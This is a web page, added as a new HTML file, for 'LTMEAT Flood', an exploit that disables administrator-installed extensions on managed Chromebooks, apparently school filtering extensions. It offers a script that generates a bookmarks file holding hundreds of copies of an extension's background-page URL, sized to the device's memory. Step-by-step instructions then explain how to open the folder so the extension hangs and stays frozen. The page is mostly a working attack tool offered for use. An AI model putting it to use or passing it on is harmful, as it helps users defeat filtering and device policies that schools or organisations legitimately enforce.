@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>LTMEAT [Flood] - Chrome OS Exploits</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="icon" href="../../assets/icon.png">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Google+Sans">
+        <link rel="stylesheet" href="../../main.css">
+        <link rel="stylesheet" href="../detail.css">
+        <script src="../addheader.js"></script>
+        <script>
+            function generateFolder() {
+                extensionId = document.getElementById("extensionId").value;
+                if (extensionId == "") {
+                    alert("[Invalid extension ID]\nPaste the 32-character ID into the field from the details page in chrome://extensions.");
+                } else {
+                    document.getElementById("folderLength").value = navigator.deviceMemory * 2.5 * 100;
+                    updateFolder();
+                }
+            }
+            function updateFolder() {
+                folderLength = document.getElementById("folderLength").value;
+                extensionpageUrl = "chrome-extension://" + extensionId + "/_generated_background_page.html\n";
+                folderContents = "chrome://extensions/?id=" + extensionId + "\n" + extensionpageUrl.repeat(folderLength - 2) + extensionpageUrl.split("\n", 1);
+                document.getElementById("generated").value = folderContents;
+                document.getElementById("folderInfo").hidden = false;
+            }
+            function exportFolder() {
+                var exportFolder = document.createElement("a");
+                exportFolder.href = "data:text/html,<!DOCTYPE NETSCAPE-Bookmark-file-1>\n<H3>LTMEAT [Flood]</H3>\n<a href=%22chrome://extensions/?id=EXTENSIONID%22%20icon=%22data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADOUlEQVQ4jXWTTWgcZRzGn/87Mzs7X92d3exkk82ymza1mlihNrRWgtSDYqgoKAkWSysRGkSQxCKB4GEPauslgVhIc6hUUxTTixhasQgpGDVatV+IVdvadGlCYp3dbLJfszPzerAJtdbn+Bx+h+cDuK3Dhw89++30ZOni2c9Hhrp2KKs+B4gDhP8Rm5iYUEaG3hlUJenj+pChhLRQ71D/N5jaCZ0ffcYggBPAeQbsnoDffj73w/pU49uaGlTKJCF/fqY8fjA6mtqUzFYXZ2967+8a5yffiFMG/r0gNDjQ90kspD9RdHzPWrgSsS59wVrqGTRThqGLiDaEgHg671HkRXHv+CmeAaMM/DUAAOrv7zflryb3xeyr7yajGjN1wdc1QawzJRjrBNe0DCnQlHIR3tBJz49+yTmICHwVgJeAYDAmzKUiAdMKir4ug5ka43VhGbomUIB812o0RVjJ68qlxAN07FhlLQMAqCWjLzMpYBYdv5avurRc9Xmh4tOfeY8cHuJac7NYcIO1Wr6Snm9bOHi7HbYG0BQxRKLIizXAdnz6q+xjPu/ClTVITRblFhr5ze8ahQsfuLxCD+3jfNog/JMDA4CIJY+SKi+vcFHMO/Dnix4cVUV8Wzvsn0z88ukflLVtKtUrlP1+3sihda0N1gUIh6Zv5MyIekTWVBQc0S1xonBTnBdmgKsXr6H6eAunTUlvaTbLKaKcPIFrNQDgnDN2AvAAIF2nvCUbSsETAgEjYblGLU7Xz//K7bjM7a0Peum+PTz2wlOl946M7eml9vKp4yPriMinO+rkA+2pzqUV5zM5IIit1XpHZ0S5YkmoPrqZhR/biu07tviiS6cRFKMNycRGp+buFe5c5ddzS7/fFwn/qEpi5wYrobPcimCGVOJzi5OzkfBlv+bez4KBjXZhOVEuV4KLC7d2/+skGYBlAH9Xx2bztaef7L384ZScfKT1ynNHj3/U2t0l9XVsuSUbqmzbBeZ5fEmWA6/+52WrkLsn39PTo7c0x280NMTCrustF4qVtgMH3swKdwPOABwATWV2ivKZqDDQ1UFt3d0YHh52tm97+FysLpZW5ODg/ldenxkb2y/9Dcy+QBiJsb59AAAAAElFTkSuQmCC%22%3EManage%20Extension%3C/a%3E" + "\n%3Ca%20href=%22chrome-extension://EXTENSIONID/_generated_background_page.html%22%3EBackground%20Page%3C/a%3E".repeat(folderLength - 1).replaceAll("EXTENSIONID", extensionId);
+                exportFolder.download = "LTMEAT Flood Export - " + extensionId + ".html";
+                exportFolder.click();
+                exportFolder.remove();
+            }
+        </script>
+        <script>
+            window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+            ga('create', 'UA-XXXXX-Y', 'auto');
+            ga('send', 'pageview');
+        </script>
+    <meta name="google-site-verification" content="weY0_IfasLpB3jj53TSPZIfHSBY2obh-2hIuFTVIrhw" /></head>
+    <body>
+        <div id="main-content">
+            <h3>
+                <image height="20px" src="../LTMEAT/assets/icon.png"></image>
+                <span class="title">LTMEAT <small>[Flood]</small></span>
+                <br>
+                <small>Ashton Davies</small>
+                <p>
+                <a href="https://github.com/3kh0/ext-remover/discussions/671" target="_blank">
+                    <svg width="16" viewBox="0 0 16 16">
+                        <path d="M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z"></path>
+                    </svg>
+                    GitHub Discussion
+                </a>
+            </h3>
+            Alternative method of LTMEAT based on <a href="https://ltmeat.bypassi.com/alt/1.txt" target="_blank">Alternate Method #1</a> that hangs and refreshes admin-installed extensions naturally without debug URLs.
+            <p>
+            <h3>Folder Setup</h3>
+            <ol>
+                <h3>Methods</h3>
+                <details open>
+                    <summary>Generate & Import Folder <em>(Automated, Recommended)</em></summary>
+                    <b>Background Page URL:</b>
+                    <br>
+                    <code>chrome-extension://<input id="extensionId" style="width: 230px;" type="text" placeholder="Extension ID Here" spellcheck="false"></input>/_generated_background_page.html</code>
+                    <p>
+                    <div id=main_div>
+                        <div id="buttons_container">
+                            <script src="assets/extensions.js"></script>
+                            <i>Detecting extensions...</i>
+                        </div>
+                    </div>
+                    <p>
+                    <button class="generateBtn" onclick="generateFolder();">Generate Folder</button>
+                    <br>
+                    <div hidden id="folderInfo">
+                        Folder length for this device: <input id="folderLength" type="number" step="100" min="100" onchange="updateFolder();"></input>
+                        <br>
+                        <textarea readonly id="generated" title="Folder Preview"></textarea>
+                        <br>
+                        <button class="exportLink" id="exportFolder" onclick="exportFolder();">Export Folder ➧</button>
+                        <p>
+                        Import the file at <u>chrome://bookmarks</u>.
+                    </div>
+                </details>
+                <details>
+                    <summary>Setup Folder <em>(Manual)</em></summary>
+                    <li>Navigate to <u>chrome://bookmarks</u>.</li>
+                    <li>Add a new folder to your bookmarks bar.</li>
+                    <li>In the folder, add the extension settings URL of the extension you want to freeze and disable.<p><code>chrome://extensions/?id=<em>[extensionid]</em></code></li>
+                    <li>Paste a page of the extension into the folder such as the generated background or manifest page many times. There must be enough to make browser loading very slow but not crash it entirely.</li>
+                </details>
+            </ol>
+            <h3>Performing the Exploit</h3>
+            <ol>
+                <h3>Instructions</h3>
+                <li>Close or disable any extra tabs, windows, or extensions to free resources during this process, for the proper result of the exploit.</li>
+                <li>Open the folder that you created in a brand new window. This can be done from its context menu.</li>
+                <li>When tabs begin to respond, close the new window.</li>
+                <li>Open the folder in a brand new window again. This should be done quickly after the window has been closed. The pages should hang automatically, similar to duplicating the tabs from hanged ones in the original methods of the LTMEAT exploit.</li>
+                <li>Toggle and flip the <b>Allow access to file URLs</b> switch in the extension settings page to refresh the extension. If the switch is not available for your extension or the extension does not control web traffic, you may be able to skip this step of the exploit.</li>
+                <li>Close the new window.</li>
+            </ol>
+            If the effect does not persist, there may not be enough pages to open from the folder in your bookmarks bar.
+            <p>
+            This method of the LTMEAT exploit may not work permanently for some filtering extensions, depending on how they are built to run in Chrome.
+            <p>
+            Extensions with Manifest V3 are not compatible with any version of the LTMEAT exploit.
+        </div>
+    </body>
+</html>
